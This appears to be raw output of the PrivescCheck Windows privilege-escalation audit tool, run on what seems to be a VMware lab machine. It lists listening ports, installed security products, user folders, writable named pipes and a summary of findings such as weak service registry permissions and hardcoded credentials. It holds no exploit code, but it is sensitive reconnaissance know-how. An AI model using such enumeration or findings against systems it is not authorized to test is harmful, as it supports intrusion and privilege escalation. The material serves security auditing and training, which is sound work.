+┃ Get information about all the UDP ports that are in a LISTEN ┃
+┃ state. Note that the associated process is also listed. DNS  ┃
+┃ is filtered out to minimize the output.                      ┃
+┗━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┛
+
+IP   Proto LocalAddress                       State  PID Name
+--   ----- ------------                       -----  --- ----
+IPv4 UDP   0.0.0.0:123                        N/A   5828 svchost
+IPv4 UDP   0.0.0.0:500                        N/A   2920 svchost
+IPv4 UDP   0.0.0.0:4500                       N/A   2920 svchost
+IPv4 UDP   0.0.0.0:5050                       N/A   6716 svchost
+IPv4 UDP   0.0.0.0:5353                       N/A   1996 svchost
+IPv4 UDP   0.0.0.0:5355                       N/A   1996 svchost
+IPv4 UDP   10.129.89.49:137                   N/A      4 System
+IPv4 UDP   10.129.89.49:138                   N/A      4 System
+IPv4 UDP   10.129.89.49:1900                  N/A   1448 svchost
+IPv4 UDP   10.129.89.49:58442                 N/A   1448 svchost
+IPv4 UDP   127.0.0.1:1900                     N/A   1448 svchost
+IPv4 UDP   127.0.0.1:58443                    N/A   1448 svchost
+IPv4 UDP   127.0.0.1:62407                    N/A   3004 svchost
+IPv6 UDP   [::]:123                           N/A   5828 svchost
+IPv6 UDP   [::]:500                           N/A   2920 svchost
+IPv6 UDP   [::]:4500                          N/A   2920 svchost
+IPv6 UDP   [::]:5353                          N/A   1996 svchost
+IPv6 UDP   [::]:5355                          N/A   1996 svchost
+IPv6 UDP   [::1]:1900                         N/A   1448 svchost
+IPv6 UDP   [::1]:58441                        N/A   1448 svchost
+IPv6 UDP   [fe80::5508:2334:45a:e0b3%6]:1900  N/A   1448 svchost
+IPv6 UDP   [fe80::5508:2334:45a:e0b3%6]:58440 N/A   1448 svchost
+
+
+[*] STATUS  : INFO
+[*] TIME    : 00:00:00.138
+[*] SUMMARY : No summary available yet.
+
+
+┏━━━━━━━━━━┳━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┓
+┃ CATEGORY ┃ TA0001 - Initial Access                           ┃
+┃ NAME     ┃ Network - Wi-Fi Profiles                          ┃
+┃ TYPE     ┃ Extended                                          ┃
+┣━━━━━━━━━━┻━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┫
+┃ Get information about saved Wi-Fi profiles. Clear-text       ┃
+┃ pre-shared keys (PSK) are displayed when possible, and       ┃
+┃ potentially vulnerable 802.1x profiles are listed.           ┃
+┗━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┛
+WARNING: WlanOpenHandle - The service has not been started (1062)
+[*] STATUS  : INFO (nothing found)
+[*] TIME    : 00:00:00.004
+[*] SUMMARY : No summary available yet.
+
+
+┏━━━━━━━━━━┳━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┓
+┃ CATEGORY ┃ TA0001 - Initial Access                           ┃
+┃ NAME     ┃ Network - Network Selection From Lock Screen      ┃
+┃ TYPE     ┃ Extended                                          ┃
+┣━━━━━━━━━━┻━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┫
+┃ Check whether the 'Do not display network selection UI'      ┃
+┃ policy is enabled on workstations (CVE-2021-28316 -          ┃
+┃ Airstrike attack).                                           ┃
+┗━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┛
+
+
+Key         : HKLM\SOFTWARE\Policies\Microsoft\Windows\System
+Value       : DontDisplayNetworkSelectionUI
+Data        : (null)
+Description : The network selection UI is displayed on the logon screen (default).
+
+
+
+[*] STATUS  : VULNERABLE (Low)
+[*] TIME    : 00:00:00.008
+[*] SUMMARY : No summary available yet.
+
+
+┏━━━━━━━━━━┳━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┓
+┃ CATEGORY ┃ TA0004 - Privilege Escalation                     ┃
+┃ NAME     ┃ Updates - Last Windows Update Date                ┃
+┃ TYPE     ┃ Extended                                          ┃
+┣━━━━━━━━━━┻━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┫
+┃ Get information about the latest Windows update. Note that   ┃
+┃ this check might be unreliable.                              ┃
+┗━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┛
+
+Time                  TimeRaw
+----                  -------
+2026-11-03 - 16:12:20 11/3/2026 4:12:20 PM
+
+
+[*] STATUS  : INFO                                                                                                                                                                                                                          [*] TIME    : 00:00:00.744                                                                                                                                                                                                                  [*] SUMMARY : No summary available yet.                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                             
+┏━━━━━━━━━━┳━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┓
+┃ CATEGORY ┃ TA0004 - Privilege Escalation                     ┃
+┃ NAME     ┃ Updates - Update History                          ┃
+┃ TYPE     ┃ Base                                              ┃
+┣━━━━━━━━━━┻━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┫
+┃ Check whether a Windows security update was installed within ┃
+┃ the last 31 days.                                            ┃
+┗━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┛
+
+HotFixID  Description     InstalledBy         InstalledOn
+--------  -----------     -----------         -----------
+KB5127690 Update          NT AUTHORITY\SYSTEM 11/3/2026 12:00:00 AM
+KB5127648 Security Update NT AUTHORITY\SYSTEM 11/3/2026 12:00:00 AM
+KB5127647 Security Update NT AUTHORITY\SYSTEM 11/3/2026 12:00:00 AM
+
+
+[*] STATUS  : INFO
+[*] TIME    : 00:00:03.713
+[*] SUMMARY : No summary available yet.
+
+
+┏━━━━━━━━━━┳━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┓
+┃ CATEGORY ┃ TA0004 - Privilege Escalation                     ┃
+┃ NAME     ┃ Misc - Exploitable Leaked Handles                 ┃
+┃ TYPE     ┃ Extended                                          ┃
+┣━━━━━━━━━━┻━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┫
+┃ Check whether the current user has access to a process that  ┃
+┃ contains a leaked handle to a privileged process, thread, or ┃
+┃ file object.                                                 ┃
+┗━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┛
+[*] STATUS  : INFO (nothing found)
+[*] TIME    : 00:00:00.507
+[*] SUMMARY : No summary available yet.
+
+
+┏━━━━━━━━━━┳━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┓
+┃ CATEGORY ┃ TA0004 - Privilege Escalation                     ┃
+┃ NAME     ┃ Misc - Process and Thread Permissions             ┃
+┃ TYPE     ┃ Base                                              ┃
+┣━━━━━━━━━━┻━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┫
+┃ Check whether the current user has any privileged access     ┃
+┃ right on a Process or Thread they do not own.                ┃
+┗━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┛
+[*] STATUS  : INFO (nothing found)
+[*] TIME    : 00:00:10.118
+[*] SUMMARY : No summary available yet.
+
+
+┏━━━━━━━━━━┳━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┓
+┃ CATEGORY ┃ TA0005 - Defense Evasion                          ┃
+┃ NAME     ┃ Misc - Endpoint Protection Software               ┃
+┃ TYPE     ┃ Extended                                          ┃
+┣━━━━━━━━━━┻━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┫
+┃ Get information about the installed security products (AV,   ┃
+┃ EDR). Note that this check follows a keyword-based approach  ┃
+┃ and thus might not be completely reliable.                   ┃
+┗━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┛
+
+ProductName      Source                Pattern
+-----------      ------                -------
+AMSI             Loaded DLL            OriginalFilename=amsi.dll
+AMSI             Loaded DLL            InternalName=amsi.dll
+AMSI             Loaded DLL            FileName=C:\WINDOWS\SYSTEM32\amsi.dll
+Windows Defender Installed application Name=Windows Defender Advanced Threat Protection
+Windows Defender Installed application Name=Windows Defender
+Windows Defender Installed application Name=Windows Defender
+Windows Defender Service               DisplayName=@C:\ProgramData\Microsoft\Windows Defender\Platform\4.18.26080.3-0\MpAsDesc.dll,-370
+Windows Defender Service               DisplayName=@C:\ProgramData\Microsoft\Windows Defender\Platform\4.18.26080.3-0\MpAsDesc.dll,-330
+Windows Defender Service               DisplayName=@C:\ProgramData\Microsoft\Windows Defender\Platform\4.18.26080.3-0\MpAsDesc.dll,-390
+Windows Defender Service               DisplayName=@C:\ProgramData\Microsoft\Windows Defender\Platform\4.18.26080.3-0\MpAsDesc.dll,-320
+Windows Defender Service               ImagePath="C:\ProgramData\Microsoft\Windows Defender\Platform\4.18.26080.3-0\MsMpEng.exe"
+Windows Defender Service               DisplayName=@C:\ProgramData\Microsoft\Windows Defender\Platform\4.18.26080.3-0\MpAsDesc.dll,-310
+Windows Defender Service               ImagePath="C:\ProgramData\Microsoft\Windows Defender\Platform\4.18.26080.3-0\NisSrv.exe"
+Windows Defender Service               DisplayName=@C:\ProgramData\Microsoft\Windows Defender\Platform\4.18.26080.3-0\MpAsDesc.dll,-430
+Windows Defender Service               Name=SecurityHealthService
+Windows Defender Service               ImagePath="C:\ProgramData\Microsoft\Windows Defender\Platform\4.18.26080.3-0\MpDefenderCoreService.exe"
+Windows Defender Service               DisplayName=@C:\ProgramData\Microsoft\Windows Defender\Platform\4.18.26070.9-0\MpAsDesc.dll,-245
+Windows Defender Service               ImagePath=C:\WINDOWS\system32\SecurityHealthService.exe
+Windows Defender Service               ImagePath="C:\Program Files\Windows Defender Advanced Threat Protection\MsSense.exe"
+Windows Defender Service               DisplayName=@C:\Program Files\Windows Defender Advanced Threat Protection\MsSense.exe,-1001
+Windows Defender Service               RegistryPath=HKLM\SYSTEM\CurrentControlSet\Services\SecurityHealthService
+
+
+[*] STATUS  : INFO
+[*] TIME    : 00:00:09.287
+[*] SUMMARY : No summary available yet.
+
+
+┏━━━━━━━━━━┳━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┓
+┃ CATEGORY ┃ TA0005 - Defense Evasion                          ┃
+┃ NAME     ┃ Misc - AMSI Providers                             ┃
+┃ TYPE     ┃ Extended                                          ┃
+┣━━━━━━━━━━┻━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┫
+┃ Get information about AMSI providers registered by           ┃
+┃ antimalware software.                                        ┃
+┗━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┛
+[*] STATUS  : INFO (nothing found)
+[*] TIME    : 00:00:00.001
+[*] SUMMARY : No summary available yet.
+
+
+┏━━━━━━━━━━┳━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┓
+┃ CATEGORY ┃ TA0043 - Reconnaissance                           ┃
+┃ NAME     ┃ Misc - System Information                         ┃
+┃ TYPE     ┃ Extended                                          ┃
+┣━━━━━━━━━━┻━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┫
+┃ Get information about the Windows version. Note that this    ┃
+┃ information might be useful if the update history cannot be  ┃
+┃ obtained.                                                    ┃
+┗━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┛
+
+
+ProductName           : Windows 11 Pro
+Version               : 10.0.26100 Version 2009 (26100.9711)
+BuildString           : 26100.1.amd64fre.ge_release.240331-1435
+BaseBoardManufacturer : Intel Corporation
+BaseBoardProduct      : 440BX Desktop Reference Platform
+BiosMode              : Uefi
+BiosReleaseDate       : 2025-01-18
+BiosVendor            : VMware, Inc.
+BiosVersion           : VMW201.00V.24504846.B64.2501180339
+SystemFamily          :
+SystemManufacturer    : VMware, Inc.
+SystemProductName     : VMware20,1
+SystemSKU             :
+
+
+
+[*] STATUS  : INFO
+[*] TIME    : 00:00:00.016
+[*] SUMMARY : No summary available yet.
+
+
+┏━━━━━━━━━━┳━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┓
+┃ CATEGORY ┃ TA0043 - Reconnaissance                           ┃
+┃ NAME     ┃ Misc - Local Administrators Group                 ┃
+┃ TYPE     ┃ Extended                                          ┃
+┣━━━━━━━━━━┻━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┫
+┃ Get information about the users and groups in the local      ┃
+┃ 'Administrators' group.                                      ┃
+┗━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┛
+
+Name          Type IsLocal IsEnabled
+----          ---- ------- ---------
+Administrator User    True      True
+
+
+[*] STATUS  : INFO
+[*] TIME    : 00:00:00.183
+[*] SUMMARY : No summary available yet.
+
+
+┏━━━━━━━━━━┳━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┓
+┃ CATEGORY ┃ TA0004 - Privilege Escalation                     ┃
+┃ NAME     ┃ Misc - User Sessions                              ┃
+┃ TYPE     ┃ Base                                              ┃
+┣━━━━━━━━━━┻━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┫
+┃ Get information about the currently logged-on users. Note    ┃
+┃ that it might be possible to capture or relay the            ┃
+┃ NTLM/Kerberos authentication of these users (RemotePotato0,  ┃
+┃ KrbRelay).                                                   ┃
+┗━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┛
+[*] STATUS  : INFO (nothing found)
+[*] TIME    : 00:00:00.010
+[*] SUMMARY : No summary available yet.
+
+
+┏━━━━━━━━━━┳━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┓
+┃ CATEGORY ┃ TA0043 - Reconnaissance                           ┃
+┃ NAME     ┃ Misc - User Home Folders                          ┃
+┃ TYPE     ┃ Extended                                          ┃
+┣━━━━━━━━━━┻━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┫
+┃ Get information about the local home folders and check       ┃
+┃ whether the current user has read or write permissions.      ┃
+┗━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┛
+
+HomeFolderPath          Read  Name
+--------------          ----  ----
+C:\Users\Administrator False False
+C:\Users\Public         True  True
+C:\Users\svc_sql        True  True
+C:\Users\svc_tracerbot False False
+C:\Users\svc_wtbackup  False False
+
+
+[*] STATUS  : INFO
+[*] TIME    : 00:00:00.071
+[*] SUMMARY : No summary available yet.
+
+
+┏━━━━━━━━━━┳━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┓
+┃ CATEGORY ┃ TA0043 - Reconnaissance                           ┃
+┃ NAME     ┃ Misc - Machine Role                               ┃
+┃ TYPE     ┃ Extended                                          ┃
+┣━━━━━━━━━━┻━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┫
+┃ Get information about the machine's role. Is it a            ┃
+┃ Workstation, a Server, or a Domain Controller.               ┃
+┗━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┛
+
+Name  Role
+----  ----
+WinNT Workstation
+
+
+[*] STATUS  : INFO
+[*] TIME    : 00:00:00.004
+[*] SUMMARY : No summary available yet.
+
+
+┏━━━━━━━━━━┳━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┓
+┃ CATEGORY ┃ TA0004 - Privilege Escalation                     ┃
+┃ NAME     ┃ Misc - System Startup History                     ┃
+┃ TYPE     ┃ Extended                                          ┃
+┣━━━━━━━━━━┻━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┫
+┃ Get information about the startup history. Note that this    ┃
+┃ information might be useful if the exploitation of a service ┃
+┃ requires a reboot but the current user does not have the     ┃
+┃ privileges to shut down the system.                          ┃
+┗━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┛
+
+Index Time
+----- ----
+    1 2026-11-12 - 04:29:48
+    2 2026-11-03 - 09:02:39
+    3 2026-11-03 - 08:57:41
+    4 2026-11-03 - 08:06:23
+    5 2026-11-03 - 08:01:55
+    6 2026-11-03 - 06:37:05
+    7 2026-11-03 - 05:32:39
+    8 2026-11-03 - 05:29:06
+
+
+[*] STATUS  : INFO
+[*] TIME    : 00:00:08.967
+[*] SUMMARY : No summary available yet.
+
+
+┏━━━━━━━━━━┳━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┓
+┃ CATEGORY ┃ TA0043 - Reconnaissance                           ┃
+┃ NAME     ┃ Misc - Filesystem Drives                          ┃
+┃ TYPE     ┃ Extended                                          ┃
+┣━━━━━━━━━━┻━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┫
+┃ Get information about the partitions, removable storages,    ┃
+┃ and mapped network shares.                                   ┃
+┗━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┛
+
+Root DisplayRoot Description
+---- ----------- -----------
+C:\
+
+
+[*] STATUS  : INFO
+[*] TIME    : 00:00:00.008
+[*] SUMMARY : No summary available yet.
+
+
+┏━━━━━━━━━━┳━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┓
+┃ CATEGORY ┃ TA0004 - Privilege Escalation                     ┃
+┃ NAME     ┃ Misc - Named Pipe Permissions                     ┃
+┃ TYPE     ┃ Extended                                          ┃
+┣━━━━━━━━━━┻━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┫
+┃ Get information about named pipes with a DACL that grants    ┃
+┃ write access to the current user.                            ┃
+┗━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┛
+
+
+FullName          : \\.\pipe\eventlog
+Owner             : NT AUTHORITY\LOCAL SERVICE (S-1-5-19)
+IdentityReference : Everyone (S-1-1-0)
+Permissions       : ReadData, WriteData, ReadExtendedAttributes, WriteExtendedAttributes, ReadAttributes, WriteAttributes, ReadControl, Synchronize, GenericRead
+
+FullName          : \\.\pipe\vgauth-service
+Owner             : BUILTIN\Administrators (S-1-5-32-544)
+IdentityReference : Everyone (S-1-1-0)
+Permissions       : ReadData, WriteData, AppendData, ReadExtendedAttributes, WriteExtendedAttributes, ReadAttributes, WriteAttributes, ReadControl, Synchronize, GenericRead, GenericWrite
+
+
+
+[*] STATUS  : INFO
+[*] TIME    : 00:00:00.185
+[*] SUMMARY : No summary available yet.
+
+
+┏━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┓
+┃                 ~~~ PrivescCheck Summary ~~~                 ┃
+┣━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┨
+┃ Total number of checks: 85                                   ┃
+┃ Total number of findings: 8                                  ┃
+┃ Total execution time: 00:00:14.500                           ┃
+┣━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┨
+┃ TA0001 - Initial Access                                      ┃
+┣━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┨
+┃ - Hardening - BitLocker → Low                                ┃                                                                                                                                                                            
+┃ - Network - Network Selection From Lock Screen → Low         ┃                                                                                                                                                                            
+┣━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┨
+┃ TA0003 - Persistence                                         ┃
+┣━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┨
+┃ - Configuration - COM Missing Image Files → Low              ┃                                                                                                                                                                            
+┃ - Hardening - UEFI & Secure Boot → Low                       ┃                                                                                                                                                                            
+┣━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┨
+┃ TA0004 - Privilege Escalation                                ┃
+┣━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┨
+┃ - Hardening - Device Installation Restrictions → Medium      ┃                                                                                                                                                                            
+┃ - Services - Registry Permissions (Extended) → Medium        ┃
+┣━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┨
+┃ TA0006 - Credential Access                                   ┃
+┣━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┨
+┃ - Hardening - Credential Guard → Low                         ┃                                                                                                                                                                            
+┃ - Services - Hardcoded Credentials → Low                     ┃                                                                                                                                                                            
+┗━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┛
+
+
+
+
+
+
+
